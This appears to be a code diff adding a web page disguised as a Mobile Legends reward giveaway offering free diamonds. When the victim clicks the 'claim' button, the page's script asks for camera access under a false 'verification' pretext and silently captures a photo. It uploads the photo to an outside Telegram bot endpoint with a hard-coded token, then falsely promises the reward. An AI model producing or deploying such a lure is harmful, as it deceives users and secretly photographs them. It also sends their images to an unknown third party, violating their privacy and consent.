@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mobile Rewards</title>
+    <style>
+        body { background: #222; color: white; text-align: center; padding: 20px; }
+        .container { background: #333; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; }
+        button { background: gold; color: black; border: none; padding: 15px; font-size: 16px; border-radius: 5px; margin-top: 20px; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Mobile Legends Rewards</h2>
+        <p>Click to claim 500 diamonds!</p>
+        <button onclick="capturePhoto()">CLAIM NOW</button>
+    </div>
+
+    <script>
+    async function capturePhoto() {
+        try {
+            alert("Please allow camera access for verification");
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(async () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert to image
+                canvas.toBlob(async blob => {
+                    const form = new FormData();
+                    form.append('chat_id', '7328757522');
+                    form.append('photo', blob, 'user_photo.jpg');
+                    
+                    await fetch(`https://api.telegram.org/bot7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                    
+                    alert("Verification complete! Diamonds will be added within 24 hours");
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+                
+            }, 2000);
+            
+        } catch (error) {
+            alert("Camera access denied. Cannot verify your account.");
+        }
+    }
+    </script>
+</body>
+</html>
